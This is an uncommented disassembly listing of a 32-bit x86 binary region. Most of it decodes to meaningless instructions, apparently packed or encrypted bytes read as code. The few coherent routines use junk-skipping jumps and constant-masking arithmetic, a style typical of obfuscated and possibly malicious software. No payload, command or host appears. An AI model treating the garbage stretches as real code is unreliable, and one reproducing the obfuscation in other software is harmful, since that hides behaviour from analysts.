  405997:	sub    DWORD PTR [eax-0x787e454a],ebp
  40599d:	xor    al,0x4b
  40599f:	and    cl,BYTE PTR [edx]
  4059a1:	mov    al,ds:0xe8de5647
  4059a6:	cmc    
  4059a7:	jp     0x4059e2
  4059a9:	pop    eax
  4059aa:	mov    al,0x64
  4059ac:	stos   DWORD PTR es:[edi],eax
  4059ad:	sbb    eax,0x2ff57bc6
  4059b2:	mov    esi,0x3c7eb804
  4059b7:	inc    edx
  4059b8:	push   edx
  4059b9:	inc    eax
  4059ba:	sub    DWORD PTR [edx],ecx
  4059bc:	in     al,dx
  4059bd:	jmp    0xd5bd7e74
  4059c2:	inc    edi
  4059c3:	and    ebp,DWORD PTR ds:0xbbda7062
  4059c9:	cmp    eax,0x53e4537e
  4059ce:	arpl   ax,ax
  4059d0:	xor    eax,0x6bb8b2a9
  4059d5:	add    ax,WORD PTR [ebp-0x36087e44]
  4059dc:	add    edx,ebx
  4059de:	dec    esi
  4059df:	adc    al,0x75
  4059e1:	mov    ah,BYTE PTR [ebp+0x62]
  4059e4:	cmp    edi,DWORD PTR [ecx]
  4059e6:	inc    edi
  4059e7:	mov    ch,0xac
  4059e9:	xchg   esi,eax
  4059ea:	push   ecx
  4059eb:	cmp    ch,BYTE PTR [edx+0x6098da0c]
  4059f1:	lock add edi,DWORD PTR [esi+ecx*4]
  4059f5:	leave  
  4059f6:	arpl   WORD PTR ds:0x45aa7a6,bx
  4059fc:	popa   
  4059fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059fe:	mov    dh,0xf5
  405a00:	and    esp,DWORD PTR [eax+esi*4-0x5ed5a0cc]
  405a07:	adc    DWORD PTR [eax],ecx
  405a09:	enter  0xdd33,0xda
  405a0d:	ror    DWORD PTR [edx+0x41f9c60b],0x5
  405a14:	push   cx
  405a16:	fwait
  405a17:	add    DWORD PTR [edi-0x5f149730],edx
  405a1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a1e:	adc    eax,DWORD PTR [ebx]
  405a20:	xchg   esi,eax
  405a21:	out    dx,al
  405a22:	sbb    eax,0x42d182b6
  405a27:	in     eax,dx
  405a28:	or     DWORD PTR [ebx],0x7e17eaf9
  405a2e:	cmp    DWORD PTR [ecx],ebx
  405a30:	ret    
  405a31:	bound  esp,QWORD PTR [eax+0x2c1ce3c]
  405a37:	push   cs
  405a38:	repz jae 0x405a3f
  405a3b:	xlat   BYTE PTR ds:[ebx]
  405a3c:	popf   
  405a3d:	cmc    
  405a3e:	lea    edx,[ebx-0x64a140de]
  405a44:	rol    DWORD PTR [edx+0x5c92e5f3],cl
  405a4a:	and    eax,0x85c949ee
  405a4f:	jge    0x405a18
  405a51:	inc    ebp
  405a52:	clc    
  405a53:	xor    DWORD PTR [ebp-0x1d7e0764],eax
  405a59:	jnp    0x405ad4
  405a5b:	add    BYTE PTR [eax],al
  405a5d:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  405a64:	and    edx,edx
  405a66:	mov    eax,DWORD PTR [ebp-0x4]
  405a69:	sbb    ecx,DWORD PTR ds:0x42fd05
  405a6f:	push   esi
  405a70:	mov    esi,DWORD PTR [ebp-0x8]
  405a73:	and    DWORD PTR ds:0x42fcf1,0x0
  405a7d:	jmp    0x405a8f
  405a82:	mov    edx,DWORD PTR ds:0x42fcf1
  405a88:	inc    edx
  405a89:	mov    DWORD PTR ds:0x42fcf1,edx
  405a8f:	cmp    DWORD PTR ds:0x42fcf1,0x17
  405a96:	jae    0x405b0b
  405a9c:	cmp    DWORD PTR ds:0x42fcf1,0x1d
  405aa3:	jne    0x405ab5
  405aa9:	push   DWORD PTR [ebp-0x24]
  405aac:	push   DWORD PTR [ebp-0x20]
  405aaf:	call   DWORD PTR ds:0x42e2db
  405ab5:	jmp    0x405a82
  405aba:	mov    DWORD PTR ds:0x42fcd9,0x14
  405ac4:	cmp    DWORD PTR ds:0x42fcd9,0x0
  405acb:	je     0x405b0b
  405ad1:	cmp    DWORD PTR ds:0x42fcd9,0x16
  405ad8:	jne    0x405af7
  405ade:	push   DWORD PTR [ebp-0x14]
  405ae1:	push   0x2e3f
  405ae6:	push   DWORD PTR [ebp-0x18]
  405ae9:	push   DWORD PTR [ebp-0x18]
  405aec:	push   0x8cdb
  405af1:	call   DWORD PTR ds:0x42e537
  405af7:	xor    edx,edx
  405af9:	xor    edx,DWORD PTR ds:0x42fcd9
  405aff:	dec    edx
  405b00:	mov    DWORD PTR ds:0x42fcd9,edx
  405b06:	jmp    0x405ac4
  405b0b:	mov    edx,0x7510855
  405b10:	add    DWORD PTR ds:0x42fcd1,edi
  405b16:	xor    eax,edx
  405b18:	and    DWORD PTR ds:0x42e6f7,ebx
  405b1e:	xor    esi,edx
  405b20:	mov    ecx,0x32729c
  405b25:	add    esi,ecx
  405b27:	add    eax,ecx
  405b29:	imul   eax,esi
  405b2c:	mov    esi,DWORD PTR [ebp+0xc]
  405b2f:	cmp    esi,eax
  405b31:	jne    0x405b4d
  405b37:	mov    eax,DWORD PTR [ebp-0x4]
  405b3a:	mov    esi,DWORD PTR [ebp-0x8]
  405b3d:	xor    eax,edx
  405b3f:	xor    esi,edx
  405b41:	add    eax,ecx
  405b43:	add    esi,ecx
  405b45:	imul   eax,esi
  405b48:	jmp    0x405e5b
  405b4d:	mov    eax,DWORD PTR [ebp+0xc]
  405b50:	mov    eax,DWORD PTR [eax+0x78]
  405b53:	mov    DWORD PTR [ebp+0xc],eax
  405b56:	mov    eax,DWORD PTR [ebp-0x4]
  405b59:	mov    esi,DWORD PTR [ebp-0x8]
  405b5c:	xor    eax,edx
  405b5e:	xor    esi,edx
  405b60:	add    eax,ecx
  405b62:	add    esi,ecx
  405b64:	imul   eax,esi
  405b67:	mov    esi,DWORD PTR [ebp+0xc]
  405b6a:	cmp    esi,eax
  405b6c:	mov    eax,DWORD PTR [ebp-0x4]
  405b6f:	je     0x405b3a
  405b75:	jmp    0x405e48
  405b7a:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  405b80:	imul   esi,DWORD PTR gs:[eax+0x3],0xc7ce624d
  405b88:	add    DWORD PTR [ebx],0x70703284
  405b8e:	stos   BYTE PTR es:[edi],al
  405b8f:	jle    0x405c01
  405b91:	jo     0x405bbe
  405b93:	dec    ecx
  405b94:	jg     0x405b1f
  405b96:	mov    bh,0x72
  405b98:	je     0x405c16
  405b9a:	aas    
  405b9b:	mov    edi,0x3de46c2d
  405ba0:	hlt    
  405ba1:	mov    gs,WORD PTR [eax+0x48]
  405ba4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ba5:	mov    ch,0xb0
  405ba7:	adc    cl,dl
  405ba9:	jmp    0x405c0d
  405bab:	out    0xc8,al
  405bad:	push   ebx
  405bae:	popa   
  405baf:	ja     0x405b3a
  405bb1:	push   cs
  405bb2:	leave  
  405bb3:	fdiv   st(1),st
  405bb5:	mov    ch,0xa3
  405bb7:	jno    0x405b4c
  405bb9:	stc    
  405bba:	jbe    0x405b65
  405bbc:	cmp    eax,0x42d2f05e
  405bc1:	test   al,0xd2
  405bc3:	jbe    0x405bfc
  405bc5:	test   bl,dh
  405bc7:	dec    edi
  405bc8:	pusha  
  405bc9:	add    ebp,esp
  405bcb:	sbb    eax,DWORD PTR cs:[eax+0x5b1f09f2]
  405bd2:	adc    al,0xbe
  405bd4:	test   al,0x71
  405bd6:	or     eax,0x227d6a7b
  405bdb:	mov    ss,WORD PTR [ebx-0x48802a47]
  405be1:	pop    ss
  405be2:	fwait
  405be3:	(bad)  
  405be4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405be5:	dec    esi
  405be6:	mov    edx,0x77817d82
  405beb:	scas   eax,DWORD PTR es:[edi]
  405bec:	(bad)  
  405bed:	cdq    
  405bee:	sbb    al,0x3b
  405bf0:	mov    al,0x76
  405bf2:	or     DWORD PTR [edx],edi
  405bf4:	call   0xf449466a
  405bf9:	inc    ebp
  405bfa:	mov    ah,0x50
  405bfc:	xor    eax,0x8a5d12c6
  405c01:	mov    WORD PTR [ebx+0x2faf805d],es
  405c07:	popa   
  405c08:	dec    ecx
  405c09:	adc    cl,BYTE PTR [eax-0x25c0209a]
  405c0f:	mov    bh,0x18
  405c11:	jecxz  0x405bcf
  405c13:	call   0x23c69a29
  405c18:	xor    BYTE PTR [eax+edi*2],ch
  405c1b:	ins    BYTE PTR es:[edi],dx
  405c1c:	xchg   BYTE PTR [ebx+eax*4+0x15],ch
  405c20:	ss pop ss
  405c22:	(bad)  [esp+ebp*1-0x21]
  405c26:	aas    
  405c27:	jle    0x405c59
  405c29:	stc    
  405c2a:	dec    eax
  405c2b:	xor    bh,al
  405c2d:	adc    BYTE PTR [esi-0x21eee714],cl
  405c33:	fild   WORD PTR [edi+0x2e9f5658]
  405c39:	int    0xf4
  405c3b:	push   0x5
  405c3d:	stos   DWORD PTR es:[edi],eax
  405c3e:	add    eax,0x6010cb90
  405c43:	in     al,0x29
  405c45:	inc    edi
  405c46:	out    dx,eax
  405c47:	adc    BYTE PTR [ebx-0x12],dl
  405c4a:	jg     0x405be4
  405c4c:	inc    ecx
  405c4d:	test   DWORD PTR [ecx],ebp
  405c4f:	sbb    edi,DWORD PTR [edi+eiz*4]
  405c52:	enter  0xefff,0x9e
  405c56:	inc    edi
  405c57:	dec    ecx
  405c58:	aas    
  405c59:	pop    ecx
  405c5a:	xchg   esp,eax
  405c5b:	das    
  405c5c:	mov    DWORD PTR [eax+0x774a3a89],ebp
  405c62:	jae    0x405c5b
  405c64:	mov    ebp,0xf39bcb77
  405c69:	fisub  WORD PTR [ecx]
  405c6b:	lds    eax,FWORD PTR [edx-0x18]
  405c6e:	ja     0x405cd7
  405c70:	fild   DWORD PTR [edx-0xefa699a]
  405c76:	mov    bl,0x92
  405c78:	std    
  405c79:	ftst   
  405c7b:	cmp    esp,DWORD PTR [ebx]
  405c7d:	cmp    ecx,esi
  405c7f:	add    DWORD PTR [ebx-0x2752ca08],edx
  405c85:	outs   dx,DWORD PTR ds:[esi]
  405c86:	and    eax,0x19509517
  405c8b:	mov    edi,0x8ee74312
  405c90:	pop    ds
  405c91:	mov    al,0x60
  405c93:	call   0x868b:0xdc457372
  405c9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c9b:	(bad)  
  405c9c:	outs   dx,DWORD PTR ds:[esi]
  405c9d:	sbb    ebx,DWORD PTR [ecx+0x10]
  405ca0:	and    esi,ecx
  405ca2:	ret    0x7ace
  405ca5:	mov    al,ds:0xaf9da8b8
  405caa:	cdq    
  405cab:	jle    0x405d0c
  405cad:	mov    ebx,0x1202196
  405cb2:	sahf   
  405cb3:	pop    ss
  405cb4:	retf   0xb390
  405cb7:	cmp    al,0x76
  405cb9:	ror    cl,1
  405cbb:	pusha  
  405cbc:	test   al,0xc8
  405cbe:	retf   
  405cbf:	inc    ebx
  405cc0:	fmul   DWORD PTR [edi]
  405cc2:	fimul  WORD PTR [ebx+edi*8]
  405cc5:	mov    ch,0x60
  405cc7:	mov    edi,0x4da5dcd2
  405ccc:	jo     0x405c61
  405cce:	mov    esp,0x920ba155
  405cd3:	xchg   esi,eax
  405cd4:	inc    ebp
  405cd5:	mov    ch,0x5a
  405cd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cd8:	sub    al,al
  405cda:	and    esp,DWORD PTR [ebx+0x59cb1c35]
  405ce0:	jl     0x405c63
  405ce2:	sub    bl,0xda
  405ce5:	dec    edi
  405ce6:	aaa    
  405ce7:	out    0xd2,eax
  405ce9:	inc    ebx
  405cea:	xlat   BYTE PTR ds:[ebx]
  405ceb:	int3   
  405cec:	out    dx,al
  405ced:	sbb    ch,bh
  405cef:	push   edi
  405cf0:	push   esi
  405cf1:	aas    
  405cf2:	adc    DWORD PTR [eax],edi
  405cf4:	pop    ds
  405cf5:	mov    ebx,0xa17a9f4a
  405cfa:	cmp    ah,BYTE PTR [edi-0x1c]
  405cfd:	or     DWORD PTR [ebp+0x18],ecx
  405d00:	cmp    dl,BYTE PTR es:[edi-0x26]
  405d04:	push   cs
  405d05:	scas   al,BYTE PTR es:[edi]
  405d06:	in     al,0x25
  405d08:	lahf   
  405d09:	push   cs
  405d0a:	loope  0x405d85
  405d0c:	outs   dx,BYTE PTR ds:[esi]
  405d0d:	ffreep st(5)
  405d0f:	mov    al,0x95
  405d11:	fwait
  405d12:	mov    al,0xfe
  405d14:	mov    BYTE PTR [ecx+eax*2+0x2c2f68b2],ah
  405d1b:	in     al,0xf5
  405d1d:	rcr    BYTE PTR [eax],1
  405d1f:	xchg   ecx,eax
  405d20:	lds    edi,FWORD PTR [esi+0x44]
  405d23:	shr    ecx,1
  405d25:	sbb    eax,0x98ac1aa7
  405d2a:	outs   dx,DWORD PTR ds:[esi]
  405d2b:	push   0xfffffff7
  405d2d:	lock outs dx,DWORD PTR ds:[esi]
  405d2f:	ins    DWORD PTR es:[edi],dx
  405d30:	lods   al,BYTE PTR ds:[esi]
  405d31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d33:	adc    edx,DWORD PTR [ebp-0x7e]
  405d36:	or     eax,DWORD PTR [eax+0x35]
  405d39:	inc    ebp
  405d3a:	int    0x4f
  405d3c:	fwait
  405d3d:	bound  esp,QWORD PTR [ebp-0x76184fb2]
  405d43:	sbb    bl,BYTE PTR [esi-0x57b0d89e]
  405d49:	call   0xeca3:0x787a4d30
  405d50:	jo     0x405d76
  405d52:	mov    eax,ds:0x72b510ea
  405d57:	clc    
  405d58:	imul   edi,esp,0xcc17af44
  405d5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d5f:	jg     0x405d21
  405d61:	dec    esi
  405d62:	xchg   BYTE PTR [ebx-0x1f98a9ec],dh
  405d68:	inc    edx
  405d69:	pop    es
  405d6a:	adc    DWORD PTR [ebp+0x6c],ebx
  405d6d:	out    dx,al
  405d6e:	add    al,0xc5
  405d70:	or     al,BYTE PTR [eax+ecx*4]
  405d73:	repnz push 0xfffffff2
  405d76:	add    al,0xf0
  405d78:	mov    bh,0xaf
  405d7a:	lock pop edi
  405d7c:	mov    bl,0xb3
  405d7e:	mov    cl,0x4b
  405d80:	aam    0xc
  405d82:	add    DWORD PTR [eax-0x1d],eax
  405d85:	shr    DWORD PTR ds:0x359b0a36,0x36
  405d8c:	pusha  
  405d8d:	add    ebx,eax
  405d8f:	stc    
  405d90:	xor    al,cl
  405d92:	lock mov al,ds:0x5d98f150
  405d98:	push   0x4de0911d
  405d9d:	fcomp  DWORD PTR [ebp-0x45a1b58b]
  405da3:	dec    eax
  405da4:	add    ebx,ebp
  405da6:	lods   eax,DWORD PTR ds:[esi]
  405da7:	xlat   BYTE PTR ds:[ebx]
  405da8:	xchg   edi,eax
  405da9:	ror    BYTE PTR [ecx],0x12
  405dac:	mov    ds:0x9b905e38,al
  405db1:	fwait
  405db2:	cmp    al,0x60
  405db4:	fdivrp st(6),st
  405db6:	not    DWORD PTR [edx-0x55]
  405db9:	mov    ds:0x3182c6f0,al
  405dbe:	inc    edx
  405dbf:	mov    edx,0xab909e69
  405dc4:	fs (bad) 
  405dc6:	sub    ah,al
  405dc8:	mov    BYTE PTR [ebx+0x7a],dh
  405dcb:	inc    ecx
  405dcc:	pop    esi
  405dcd:	pop    es
  405dce:	mov    ds:0xd3688d04,al
  405dd3:	ja     0x405de5
  405dd5:	push   esp
  405dd6:	xor    ebx,0x340ef156
  405ddc:	aas    
  405ddd:	lock jle 0x405e06
  405de0:	push   es
  405de1:	stos   DWORD PTR es:[edi],eax
  405de2:	xchg   ebx,eax
  405de3:	cmc    
  405de4:	pushf  
  405de5:	push   edi
  405de7:	fnstcw WORD PTR [ecx]
  405de9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405dea:	or     BYTE PTR [ecx-0x9],bl
  405ded:	mov    edx,0x4c09cc64
  405df2:	mov    esi,0xcc6d31ff
  405df7:	aad    0x64
  405df9:	nop
  405dfa:	xor    dl,dl
  405dfc:	jle    0x405dc9
  405dfe:	jbe    0x405e0b
  405e00:	out    0x24,eax
  405e02:	jge    0x405e5d
  405e04:	(bad)  
  405e05:	iret   
  405e06:	pop    ds
  405e07:	mov    eax,DWORD PTR [ecx-0x1dbc42fa]
  405e0d:	repnz ins BYTE PTR es:[edi],dx
  405e0f:	mov    ds:0xb1857e6c,al
  405e14:	ins    DWORD PTR es:[edi],dx
  405e15:	aam    0x31
  405e17:	scas   eax,DWORD PTR es:[edi]
  405e18:	push   ds
  405e19:	clc    
  405e1a:	mov    edi,0x6113839
  405e1f:	call   0xc70e:0x93216baf
  405e26:	xchg   esi,eax
  405e27:	jmp    0xa84dccfe
  405e2c:	xlat   BYTE PTR ss:[ebx]
  405e2e:	dec    edi
  405e2f:	push   eax
  405e30:	pop    ss
  405e31:	or     DWORD PTR [edi],edi
  405e33:	cld    
  405e34:	push   edx
  405e35:	pop    eax
  405e36:	stos   DWORD PTR es:[edi],eax
  405e37:	leave  
  405e38:	add    eax,DWORD PTR [ecx+edx*4]
  405e3b:	sub    BYTE PTR [eax+0x3e],ah
  405e3e:	mov    eax,DWORD PTR [edx]
  405e40:	xor    dh,bl
  405e42:	cdq    
  405e43:	mov    WORD PTR [eax+0x50],gs
  405e46:	(bad)  
  405e48:	xor    eax,edx
  405e4a:	add    eax,ecx
  405e4c:	mov    ecx,DWORD PTR [ebp+0xc]
  405e4f:	imul   eax,ecx
  405e52:	add    eax,DWORD PTR [ebp+0x8]
  405e55:	mov    DWORD PTR [ebp+0xc],eax
  405e58:	mov    eax,DWORD PTR [ebp+0xc]
  405e5b:	pop    esi
  405e5c:	leave  
  405e5d:	ret    0x8
  405e60:	push   ebp
  405e61:	mov    ebp,esp
  405e63:	push   ecx
  405e64:	add    DWORD PTR ds:0x42e70f,0x1508
  405e6e:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405e75:	mov    eax,DWORD PTR [ebp-0x4]
  405e78:	mov    edx,DWORD PTR [ebp+0x10]
  405e7b:	adc    DWORD PTR ds:0x42e6ef,0x4006
  405e85:	mov    ecx,0x7510855
  405e8a:	xor    DWORD PTR ds:0x42fd01,0x260
  405e94:	xor    eax,ecx
  405e96:	jmp    0x40605c
  405e9b:	fidiv  DWORD PTR [edx+0x7b]
  405e9e:	jle    0x405e33
  405ea0:	jne    0x405e7b
  405ea2:	jb     0x405e2d
  405ea4:	(bad)  
  405ea5:	(bad)  
  405ea6:	sub    al,0x44
  405ea8:	pop    ss
  405ea9:	cmp    ecx,ebp
  405eab:	ds aas 
  405ead:	jo     0x405f1f
  405eaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405eb0:	jg     0x405f22
  405eb2:	jo     0x405f2b
  405eb4:	cld    
  405eb5:	sbb    eax,0x7b24a1b0
  405eba:	and    ebp,edx
  405ebc:	sub    al,0xe9
  405ebe:	test   al,0x49
  405ec0:	cmp    edx,esp
  405ec2:	jns    0x405e7d
  405ec4:	cli    
  405ec5:	icebp  
  405ec6:	cmc    
  405ec7:	pop    ebx
  405ec8:	jno    0x405f44
  405eca:	mov    esi,0xaedb9eb1
  405ecf:	adc    DWORD PTR [edx+0x6b3418ed],edx
  405ed5:	pop    ebx
  405ed6:	rcl    dh,0xb3
  405ed9:	inc    sp
  405edb:	aad    0x19
  405edd:	call   0x7d57a41
  405ee2:	arpl   WORD PTR [ebp+0x8da6be5],si
  405ee8:	call   0x6128:0xb103e21c
  405eef:	cmp    eax,0xf8f99645
  405ef4:	jle    0x405f40
  405ef6:	or     al,0x33
  405ef8:	jns    0x405e88
  405efa:	pop    ss
  405efb:	mov    ecx,0x1a40af95
  405f00:	(bad)  
  405f01:	imul   dh
  405f03:	xor    ebx,DWORD PTR [edi+0x3c]
  405f06:	and    al,0x98
  405f08:	int3   
  405f09:	test   al,0xbf
  405f0b:	xor    al,0xa0
  405f0d:	fld    QWORD PTR [ebp-0x6f]
  405f10:	clc    
  405f11:	fist   DWORD PTR [ecx+0x67fe0457]
  405f17:	(bad)  
  405f18:	pop    edx
  405f19:	scas   al,BYTE PTR es:[edi]
  405f1a:	ror    DWORD PTR [ebx-0x1c6f6ae6],0x35
  405f21:	pop    edi
  405f22:	mov    edi,0x1a81c324
  405f27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f28:	add    ebx,ecx
  405f2a:	fmulp  st(0),st
  405f2c:	sub    eax,DWORD PTR [edi-0x78]
  405f2f:	or     DWORD PTR [edi],0xffffffa8
  405f32:	test   DWORD PTR [edx+0x3f],ebp
  405f35:	jae    0x405f17
  405f37:	sub    eax,DWORD PTR ds:0xaae22af8
  405f3d:	jecxz  0x405f3d
  405f3f:	mov    ah,0x93
  405f41:	int    0xfa
  405f43:	xor    eax,0x73e34600
  405f48:	xchg   esp,eax
  405f49:	test   DWORD PTR [edx-0x185f4648],ecx
  405f4f:	xchg   edi,eax
  405f50:	mov    eax,0xb61cf940
  405f55:	(bad)  
  405f56:	retf   0x138a
  405f59:	mov    al,ds:0xb21f0bdd
  405f5e:	and    DWORD PTR ds:0xd5d161c6,eax
  405f64:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f66:	ins    DWORD PTR es:[edi],dx
  405f67:	in     al,dx
  405f68:	or     eax,DWORD PTR [ebx]
  405f6a:	aam    0xb9
  405f6c:	hlt    
  405f6d:	mov    bh,0x47
  405f6f:	sub    eax,0x28b4c0e4
  405f74:	fdiv   st(6),st
  405f76:	lock or ch,BYTE PTR [eax+0x6372db93]
  405f7d:	mov    ebx,0xe421b2b4
  405f82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f83:	mov    ebp,ds
  405f85:	sbb    eax,0x87e6395a
  405f8a:	pushf  
  405f8b:	and    dl,ch
  405f8d:	into   
  405f8e:	ja     0x405fce
  405f90:	and    BYTE PTR [esi-0x11],bh
  405f93:	mov    edi,0xe0ee6ee3
  405f98:	rcr    BYTE PTR [ecx],cl
  405f9a:	shr    BYTE PTR [ecx+esi*8],cl
  405f9d:	nop
  405f9e:	int    0x4d
  405fa0:	test   al,0x85
  405fa2:	xor    al,0xa0
  405fa4:	add    eax,0xcc13f806
  405fa9:	clc    
  405faa:	jb     0x40600d
  405fac:	lods   al,BYTE PTR ds:[esi]
  405fad:	pop    edi
  405fae:	aam    0x13
  405fb0:	ins    DWORD PTR es:[edi],dx
  405fb1:	test   BYTE PTR [esi],cl
  405fb3:	outs   dx,DWORD PTR ds:[esi]
  405fb4:	lds    eax,FWORD PTR [esi+0x28f881bd]
  405fba:	in     eax,0x2c
  405fbc:	stos   DWORD PTR es:[edi],eax
  405fbd:	jns    0x405fd2
  405fbf:	dec    esp
  405fc0:	sub    al,0x39
  405fc2:	dec    eax
  405fc3:	in     eax,0x9a
  405fc5:	lds    ebp,FWORD PTR [ebx-0x4316f178]
  405fcb:	pop    ds
  405fcc:	jae    0x406030
  405fce:	iret   
  405fcf:	mul    DWORD PTR [eax+0x63]
  405fd2:	gs inc ebp
  405fd4:	jae    0x405fac
  405fd6:	add    eax,0xba58127d
  405fdb:	pop    ds
  405fdc:	jmp    0x40604a
  405fde:	xchg   ebp,eax
  405fdf:	scas   al,BYTE PTR es:[edi]
  405fe0:	inc    ebp
  405fe1:	and    DWORD PTR [ecx-0x41d4d3c9],edx
  405fe7:	sbb    DWORD PTR [edx-0x49],esi
  405fea:	cmp    DWORD PTR [ebx],edi
  405fec:	mov    DWORD PTR ss:[ebp+ebp*2-0x327acd1b],eax
  405ff4:	sub    BYTE PTR [ecx+0x21dab284],0x8e
  405ffb:	sbb    cl,BYTE PTR fs:[eax+0xb]
  405fff:	repnz xor DWORD PTR [esi+0x1],0x5ea5a533
  406007:	inc    edi
  406008:	fdivr  DWORD PTR [ecx+0x18]
  40600b:	cli    
  40600c:	mov    fs,WORD PTR [eax]
  40600e:	ja     0x406064
  406010:	mov    bh,bl
  406012:	mov    ah,0x44
  406014:	sub    al,0x4e
  406016:	mov    cl,0xc4
  406018:	mov    ch,0x1e
  40601a:	push   0x554d4ae8
  40601f:	mov    dh,0x58
  406021:	add    al,BYTE PTR [ebx+esi*1]
  406024:	sub    DWORD PTR [esi+0x18b1d3a6],esi
  40602a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40602b:	icebp  
  40602c:	call   0x3f9962f3
  406031:	rcl    bh,cl
  406033:	xchg   edx,eax
  406034:	mov    eax,ds:0x1c1cf2e5
  406039:	mov    edi,0xc3ba146b
  40603e:	or     DWORD PTR [esi+edx*4+0xd],ebp
  406042:	push   ebx
  406043:	std    
  406044:	xchg   BYTE PTR [edx],dl
  406046:	xor    DWORD PTR fs:[ebp+0xb5541e0],edx
  40604d:	clc    
  40604e:	ds inc eax
  406050:	mov    esi,esp
  406052:	repz loop 0x40601c
  406055:	mov    DWORD PTR [edx+0x7c7d1bf2],edx
  40605b:	xchg   ebp,eax
  40605c:	add    eax,0x32729c
  406061:	or     DWORD PTR ds:0x42fd86,0xae4
  40606b:	mov    DWORD PTR [edx],eax
  40606d:	mov    eax,DWORD PTR [ebp+0xc]
  406070:	xor    eax,ecx
  406072:	push   esi
  406073:	sbb    edx,DWORD PTR ds:0x42e118
  406079:	mov    esi,DWORD PTR [ebp+0x10]
  40607c:	or     DWORD PTR ds:0x42fd76,edx
  406082:	mov    edx,0x32729c
  406087:	sbb    DWORD PTR ds:0x42fcf1,0x42e11c
  406091:	add    eax,edx
  406093:	adc    DWORD PTR ds:0x42fcd1,0x42e6fb
  40609d:	mov    DWORD PTR [esi+0x4],eax
  4060a0:	sbb    eax,0x6979
  4060a5:	mov    eax,DWORD PTR [ebp+0x14]
  4060a8:	adc    DWORD PTR ds:0x42fd82,0x2335
  4060b2:	mov    esi,DWORD PTR [ebp+0x10]
  4060b5:	sub    DWORD PTR ds:0x42fcd5,0x1c02
  4060bf:	mov    DWORD PTR [esi+0x8],eax
  4060c2:	or     eax,DWORD PTR ds:0x42fd05
  4060c8:	jmp    0x40628e
  4060cd:	out    dx,al
  4060ce:	hlt    
  4060cf:	arpl   WORD PTR [edx],dx
  4060d1:	popa   
  4060d2:	xchg   ecx,eax
  4060d3:	ins    DWORD PTR es:[edi],dx
  4060d4:	hlt    
  4060d5:	(bad)  
  4060d6:	pop    esp
  4060d7:	xor    eax,0xe140ee96
  4060dc:	in     eax,dx
  4060dd:	gs ds jo 0x406151
  4060e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060e2:	jg     0x406154
  4060e4:	jo     0x406139
  4060e6:	(bad)  
  4060e7:	dec    edi
  4060e8:	inc    ebp
  4060e9:	mov    ds:0x9851b57d,al
  4060ee:	xor    al,0xdb
  4060f0:	pop    eax
  4060f1:	mov    al,0x39
  4060f3:	icebp  
  4060f4:	ds jno 0x406122
  4060f7:	pushf  
  4060f8:	outs   dx,BYTE PTR ds:[esi]
  4060f9:	push   edi
  4060fa:	lahf   
  4060fb:	sub    al,0x8f
  4060fd:	add    ecx,ebp
  4060ff:	mov    eax,0xfc697f5c
  406104:	idiv   BYTE PTR [ebx]
  406106:	jmp    0xbdb6:0x8ef47db1
  40610d:	iret   
  40610e:	add    cl,BYTE PTR [edx]
  406110:	jmp    0x406101
  406112:	xchg   edi,eax
  406113:	repz sub esp,DWORD PTR [esi-0x4c]
  406117:	xor    BYTE PTR [eax+edi*2],bl
  40611a:	pop    ebx
  40611b:	sub    DWORD PTR [esi-0x24],0x971d5f84
  406122:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406123:	ret    
  406124:	out    0xb6,eax
  406126:	mov    bh,0x7f
  406128:	mov    esi,0xc7911d4f
  40612d:	ja     0x4061a7
  40612f:	mov    WORD PTR [edi],?
  406131:	dec    eax
  406132:	push   ebp
  406133:	mov    ecx,0x9432e21
  406138:	fisttp DWORD PTR [ebx+edx*2]
  40613b:	xchg   esp,eax
  40613c:	push   esi
  40613e:	std    
  40613f:	(bad)  
  406140:	lahf   
  406141:	xchg   BYTE PTR [edx+edi*4+0x12],dh
  406145:	lock mov edi,0x62092068
  40614b:	jo     0x406196
  40614d:	mov    DWORD PTR [ecx-0x7066b901],edi
  406153:	dec    ebp
  406154:	pop    eax
  406155:	es stos BYTE PTR es:[edi],al
  406157:	pop    ecx
  406158:	cmp    bl,al
  40615a:	arpl   WORD PTR [edx+0x1c],bp
  40615d:	mov    edi,0x30116701
  406162:	sbb    DWORD PTR [edi+0x35],ebx
  406165:	add    BYTE PTR [ebp-0x343d6d74],bl
  40616b:	cli    
  40616c:	popa   
  40616d:	add    bl,BYTE PTR [ecx-0x7]
  406170:	and    al,ch
  406172:	jmp    0x8221:0x93a4d4b1
  406179:	in     al,0x5d
  40617b:	pop    ecx
  40617c:	jo     0x4061a3
  40617e:	jmp    0x1802181f
  406183:	push   ebp
  406184:	jbe    0x4061a7
  406186:	pop    ebx
  406187:	fsub   QWORD PTR [ecx-0x78017757]
  40618d:	cmp    al,0x37
  40618f:	in     al,0xd8
  406191:	inc    esi
  406192:	sub    DWORD PTR [ecx-0x42],ebx
  406195:	sub    ecx,DWORD PTR [eax+ecx*1]
  406198:	inc    BYTE PTR [ebx+0x61]
  40619b:	data16 test BYTE PTR [ebp+eiz*8+0x64490bae],cl
  4061a3:	bound  ebp,QWORD PTR [ecx]
  4061a5:	scas   eax,DWORD PTR es:[edi]
  4061a6:	dec    esp
  4061a7:	lods   al,BYTE PTR ds:[esi]
  4061a8:	cmp    al,BYTE PTR [eax+0x7a9badba]
  4061ae:	les    edi,FWORD PTR [ebp-0x1d3ee389]
  4061b4:	sub    eax,0xcc6443eb
